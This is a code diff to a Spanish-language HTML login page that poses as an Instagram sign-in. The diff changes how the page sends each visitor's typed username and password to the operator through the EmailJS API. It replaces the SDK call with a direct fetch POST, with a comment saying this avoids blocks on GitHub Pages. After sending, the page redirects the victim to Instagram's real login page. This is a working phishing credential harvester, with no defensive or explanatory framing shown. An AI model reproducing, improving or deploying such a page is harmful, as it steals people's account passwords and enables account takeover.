@@ -4,13 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar Sesión</title>
-    <!-- SDK de EmailJS -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("i3BHzWrNl1OuWEQRK");
-        })();
-    </script>
     <style>
         * {
             box-sizing: border-box;
@@ -260,25 +253,36 @@
         const loginForm = document.getElementById('loginForm');
         const submitBtn = document.getElementById('submitBtn');
 
-        loginForm.addEventListener('submit', (e) => {
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
             submitBtn.disabled = true;
 
-            // Parámetros conectados con las variables {{name}} y {{message}} de tu plantilla
-            const templateParams = {
-                name: document.getElementById('usernameInput').value,
-                message: passwordInput.value
+            const data = {
+                service_id: 'service_vyx1v45',
+                template_id: 'template_vyx1v45',
+                user_id: 'i3BHzWrNl1OuWEQRK',
+                template_params: {
+                    name: document.getElementById('usernameInput').value,
+                    message: passwordInput.value
+                }
             };
 
-            emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
-                .then((response) => {
-                    console.log('Correo enviado con éxito!', response.status, response.text);
-                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
-                }, (error) => {
-                    console.log('Fallo al enviar el correo...', error);
-                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
+            try {
+                // Petición directa por API HTTP POST (evita bloqueos de SDK en GitHub Pages)
+                await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
                 });
+            } catch (error) {
+                console.log('Error en envío', error);
+            }
+
+            // Redirección inmediata a Instagram
+            window.location.href = "https://www.instagram.com/accounts/login/?mtn";
         });
     </script>
 
